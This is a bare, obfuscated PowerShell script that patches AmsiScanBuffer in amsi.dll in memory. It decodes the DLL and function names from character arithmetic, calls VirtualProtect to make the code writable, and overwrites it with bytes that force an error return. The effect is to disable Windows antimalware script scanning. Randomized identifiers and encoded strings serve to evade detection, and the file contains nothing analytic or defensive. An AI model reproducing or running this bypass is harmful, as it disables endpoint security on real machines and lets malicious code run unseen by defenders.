$_Wwj4J0YOIIAGEqed = @"
using System;
using System.Runtime.InteropServices;
public class _Wwj4J0YOIIAGEqed {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr u62217mwPvwgQ8v, string IRcR);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr e4VUV5nT, UIntPtr wI72DSA, uint kYFH49dUO3q5TO2D, out uint FkAHyfSUn343lmc0z);
}
"@

Add-Type $_Wwj4J0YOIIAGEqed

$EJ_YfqKIiXQ0K0m = [_Wwj4J0YOIIAGEqed]::LoadLibrary("$([cHAr]([byTe]0x61)+[char]([bYTE]0x6d)+[chAr]([BYTe]0x73)+[Char]([byTe]0x69)+[ChAr]([ByTe]0x2e)+[CHaR](78+22)+[cHaR](108)+[cHaR](108+39-39))")
$tiTwGkzYTfRiCw = [_Wwj4J0YOIIAGEqed]::GetProcAddress($EJ_YfqKIiXQ0K0m, "$(('ÄmsíScânBúff'+'èr').norMaliZe([chAr](70)+[ChAr](19+92)+[cHAR]([ByTe]0x72)+[ChAR]([bYTe]0x6d)+[ChAR](68+37-37)) -replace [ChAR](62+30)+[chAr]([bYTE]0x70)+[Char](97+26)+[chAr](77*37/37)+[cHaR](110*22/22)+[cHAR](125+15-15))")
$p = 0
[_Wwj4J0YOIIAGEqed]::VirtualProtect($tiTwGkzYTfRiCw, [uint32]5, 0x40, [ref]$p)
$X_eGgL9I3cX7G6qKw2 = "0xB8"
$Zy3H7 = "0x57"
$mvTMjuUaek = "0x00"
$sYPj8VEls8Vf = "0x07"
$EhaflTEjR2EFsG8zN84j = "0x80"
$WhUac = "0xC3"
$QgKHXZP = [Byte[]] ($X_eGgL9I3cX7G6qKw2,$Zy3H7,$mvTMjuUaek,$sYPj8VEls8Vf,+$EhaflTEjR2EFsG8zN84j,+$WhUac)
[System.Runtime.InteropServices.Marshal]::Copy($QgKHXZP, 0, $tiTwGkzYTfRiCw, 6)